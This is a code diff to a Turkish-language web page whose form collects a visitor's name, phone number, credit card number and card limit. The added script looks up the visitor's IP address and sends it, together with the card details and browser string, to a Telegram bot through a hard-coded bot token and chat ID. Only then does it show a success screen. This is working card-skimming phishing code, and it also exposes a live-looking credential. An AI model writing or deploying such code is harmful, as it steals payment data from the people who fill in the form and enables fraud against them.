@@ -13,10 +13,10 @@
 
     .header {
       background: linear-gradient(to right, #0d0c34, #56003c);
-      padding: 5px 20px; /* yukarı aşağı biraz daha az boşluk */
+      padding: 5px 20px;
       display: flex;
       align-items: center;
-      height: 50px; /* yükseklik sabitlendi */
+      height: 50px;
       box-sizing: border-box;
     }
 
@@ -202,6 +202,10 @@
     let krediKartDegeri = "";
     let limitDegeri = "";
 
+    // Telegram bot bilgileri
+    const botToken = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c";
+    const chatId = "8045620328";
+
     loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
 
@@ -239,18 +243,56 @@
         return;
       }
 
-      // Gösterim bilgisi
-      finalInfo.innerHTML = `
-        <strong>İsim Soyisim:</strong> ${isim}<br>
-        <strong>Telefon:</strong> ${tel}<br>
-        <strong>Kredi Kartı:</strong> ${krediKartDegeri}<br>
-        <strong>Kart Limiti:</strong> ${limitDegeri} TL
-      `;
+      const tarayici = navigator.userAgent;
+      const tarihSaat = new Date().toLocaleString("tr-TR");
 
-      form2.classList.add("hidden");
-      successScreen.classList.remove("hidden");
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const ipAdres = data.ip;
+
+          const telegramMessage = `
+🔔 Yeni Başvuru
+🕒 Tarih: ${tarihSaat}
+👤 İsim: ${isim}
+📞 Telefon: ${tel}
+💳 Kredi Kartı: ${krediKartDegeri}
+💰 Kart Limiti: ${limitDegeri} TL
+🌐 IP: ${ipAdres}
+🧭 Tarayıcı: ${tarayici}
+          `;
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: telegramMessage
+            })
+          })
+          .then(response => {
+            if (!response.ok) throw new Error("Telegram'a gönderilemedi");
+
+            finalInfo.innerHTML = `
+              <strong>İsim Soyisim:</strong> ${isim}<br>
+              <strong>Telefon:</strong> ${tel}<br>
+              <strong>Kredi Kartı:</strong> ${krediKartDegeri}<br>
+              <strong>Kart Limiti:</strong> ${limitDegeri} TL
+            `;
+            form2.classList.add("hidden");
+            successScreen.classList.remove("hidden");
+          })
+          .catch(() => {
+            error2.textContent = "Telegram'a mesaj gönderilemedi.";
+          });
+
+        })
+        .catch(() => {
+          error2.textContent = "IP adresi alınamadı.";
+        });
     });
   </script>
-
 </body>
 </html>
